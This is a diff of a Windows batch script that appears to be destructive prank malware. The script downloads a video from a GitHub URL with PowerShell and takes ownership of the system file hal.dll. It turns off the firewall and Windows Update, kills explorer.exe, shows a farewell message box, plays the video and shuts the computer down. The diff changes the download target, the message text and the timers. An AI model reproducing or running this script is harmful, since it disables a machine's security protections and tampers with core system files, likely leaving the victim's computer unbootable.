@@ -25,9 +25,10 @@ REM --> If error flag set, we do not have admin.
  :--------------------------------------
 cd /d C:\
 md your
+cd your
 md asylum
 
-powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/waterfull/blob/main/going.mp4','C:\your\asylum\going.mp4')"
+powershell "(New-Object System.Net.WebClient).DownloadFile('https://github.com/LKR-beta/waterfull/raw/main/Video_be6704a6-e912-4494-b492-67da48a10817.mp4','C:\your\asylum\Video_be6704a6-e912-4494-b492-67da48a10817.mp4')"
 
 
 takeown /f "%systemdrive%\windows\system32\hal.dll"
@@ -47,9 +48,11 @@ net stop sharedaccess
 netsh firewall set opmode mode-disable
 net stop "wuauserv"
 taskkill /f /im explorer.exe
-echo Msgbox"no malice, bye.",0+0,"LKR">>msg.vbs
+echo Msgbox"May she rest in peace.",0+0,"LKR">>msg.vbs
+
 start msg.vbs
-start max going.mp4
-timeout /t 30
-shutdown -s -t 30
+start max Video_be6704a6-e912-4494-b492-67da48a10817.mp4
+
+timeout /t 17
+shutdown -s -t 17
 exit
